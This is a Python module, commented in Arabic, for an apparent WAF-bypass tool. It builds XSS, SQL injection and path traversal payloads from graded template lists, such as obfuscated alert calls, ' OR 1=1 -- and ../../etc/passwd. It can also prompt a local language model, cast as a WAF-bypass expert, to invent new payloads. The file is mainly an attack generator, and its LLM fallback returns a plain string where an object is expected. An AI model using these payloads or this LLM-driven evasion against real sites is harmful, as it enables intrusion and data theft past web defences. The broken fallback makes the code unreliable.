"""
Generative LLM Agent — وكيل توليدي يُنشئ payloads بناءً على السياق
======================================================================
يولّد.payloads متنوعة بناءً على:
  - نوع الثغرة (XSS، SQLi، Path Traversal، إلخ)
  - نوع WAF (ModSecurity، Cloudflare، WAF-Brain، إلخ)
  - السياق من RAG و RL Policy Optimizer

يمكنه العمل بوضعين:
  1. Local templates — قوالب مبرمجة مسبقاً (بدون الحاجة ل_model)
  2. عبر LLM محلي (Ollama) — توليد ذكي ديناميكي
"""
from __future__ import annotations

import random
from dataclasses import dataclass
from typing import Any, Dict, List, Optional


@dataclass
class GeneratedPayload:
    payload: str
    technique: str
    level: int  # 1-9 من السلم
    source: str  # "template" | "llm"
    waf_type: str
    vuln_type: str
    confidence: float = 0.5


class GenerativeAgent:
    """
    يولّد payloads بناءً على السياق (WAF type + vuln type + technique level).
    """

    # قوالب محلية لكل نوع ثغرة ومستوى من السلم
    XSS_TEMPLATES: Dict[int, List[str]] = {
        1: [
            "<svg onload=ALERT(1)>",
            "<svg onload=alert(1)>",
            "<IMG SRC=javascript:alert(1)>",
            "<body onload=alert(1)>",
        ],
        2: [
            "<svg onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<math><svg onload=alert(1)>",
        ],
        3: [
            "<div ontoggle=alert(1)></div>",
            "<div onpointerenter=alert(1)></div>",
            "<div onanimationend=alert(1)></div>",
            "<div onbeforetoggle=alert(1)></div>",
        ],
        4: [
            "window['al'+'ert'](1)",
            "al\\u0065rt(1)",
            "eval(atob('YWxlcnQoMSk='))",
            "eval(`alert(1)`)",
            "[]['filter']['constructor']('return alert(1)')()",
        ],
        5: [
            "<svg onload=alert(1)>",
        ],
        6: [
            "q=1&q=<svg onload=alert(1)>",
        ],
        7: [
            "<svg onload=alert(1)>",
        ],
        8: [
            "<svg onload=alert(1)>",
        ],
        9: [
            "<svg onload=alert(1)>",
        ],
    }

    SQLI_TEMPLATES: Dict[int, List[str]] = {
        1: [
            "' OR 1=1 --",
            "' OR '1'='1",
            "admin' --",
            "' UNION SELECT 1,2,3 --",
        ],
        2: [
            "' OR 1=1 --",
            "%27%20OR%201%3D1%20--",
        ],
        3: [
            "' OR 1=1 --",
        ],
        4: [
            "CHAR(97)||CHAR(108)||CHAR(101)||CHAR(114)||CHAR(116)",
        ],
        5: [
            "' OR 1=1 --",
        ],
        6: [
            "id=1&id=' OR 1=1 --",
        ],
        7: [
            "' OR 1=1 --",
        ],
        8: [
            "' OR 1=1 --",
        ],
        9: [
            "' OR 1=1 --",
        ],
    }

    PATH_TRAVERSAL_TEMPLATES: Dict[int, List[str]] = {
        1: [
            "../../etc/passwd",
            "..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2fetc/passwd",
        ],
        2: [
            "....//....//etc/passwd",
            "..%252f..%252fetc/passwd",
        ],
        3: [
            "../../etc/passwd",
        ],
        4: [
            "../../etc/passwd",
        ],
        5: [
            "/etc/passwd%00",
        ],
        6: [
            "file=../../etc/passwd&file=/etc/passwd",
        ],
        7: [
            "../../etc/passwd",
        ],
        8: [
            "../../etc/passwd",
        ],
        9: [
            "../../etc/passwd",
        ],
    }

    def __init__(self, use_llm: bool = False, llm_endpoint: Optional[str] = None,
                 llm_model: str = "qwen2.5:14b"):
        self.use_llm = use_llm
        self.llm_endpoint = llm_endpoint
        self.llm_model = llm_model

    def generate(
        self,
        vuln_type: str,
        waf_type: str,
        technique_level: int,
        technique_name: str,
        rag_context: Optional[str] = None,
    ) -> GeneratedPayload:
        """
        يولّد payload بناءً على السياق.
        """
        # حاول القالب المحلي أولاً
        template_payload = self._template(vuln_type, technique_level)
        if template_payload:
            return GeneratedPayload(
                payload=template_payload,
                technique=technique_name,
                level=technique_level,
                source="template",
                waf_type=waf_type,
                vuln_type=vuln_type,
                confidence=0.6,
            )

        # fallback عبر LLM إن توفرت الإعدادات
        if self.use_llm and self.llm_endpoint:
            return self._generate_via_llm(vuln_type, waf_type, technique_level, technique_name, rag_context)

        # fallback أخير
        return GeneratedPayload(
            payload=f"<svg onload=alert(1)>",  # safe default
            technique=technique_name,
            level=technique_level,
            source="fallback",
            waf_type=waf_type,
            vuln_type=vuln_type,
            confidence=0.3,
        )

    def _template(self, vuln_type: str, level: int) -> Optional[str]:
        tables = {
            "xss": self.XSS_TEMPLATES,
            "sqli": self.SQLI_TEMPLATES,
            "sql_injection": self.SQLI_TEMPLATES,
            "path_traversal": self.PATH_TRAVERSAL_TEMPLATES,
            "lfi": self.PATH_TRAVERSAL_TEMPLATES,
        }
        table = tables.get(vuln_type.lower())
        if not table:
            return None
        variants = table.get(level, table.get(1, []))
        if not variants:
            return None
        return random.choice(variants)

    def _generate_via_llm(
        self,
        vuln_type: str,
        waf_type: str,
        level: int,
        technique: str,
        rag_context: Optional[str],
    ) -> GeneratedPayload:
        try:
            import httpx
            prompt = (
                f"أنت خبير في تجاوز WAF. أنشئ payload لـ {vuln_type} ضد WAF من نوع {waf_type}.\n"
                f"المستوى: {level} ({technique})\n"
                f"السياق من RAG: {rag_context or 'لا يوجد'}\n\n"
                "أجب بالpayload فقط بدون شرح إضافي."
            )
            with httpx.Client(timeout=15) as client:
                resp = client.post(self.llm_endpoint, json={
                    "model": self.llm_model,
                    "prompt": prompt,
                    "stream": False,
                })
                if resp.status_code == 200:
                    data = resp.json()
                    payload = data.get("response", "").strip().strip('"').strip("'")
                    if payload:
                        return GeneratedPayload(
                            payload=payload,
                            technique=technique,
                            level=level,
                            source="llm",
                            waf_type=waf_type,
                            vuln_type=vuln_type,
                            confidence=0.7,
                        )
        except Exception:
            pass

        return self._template(vuln_type, level) or GeneratedPayload(
            payload="<svg onload=alert(1)>",
            technique=technique,
            level=level,
            source="fallback",
            waf_type=waf_type,
            vuln_type=vuln_type,
            confidence=0.3,
        )


__all__ = ["GenerativeAgent", "GeneratedPayload"]
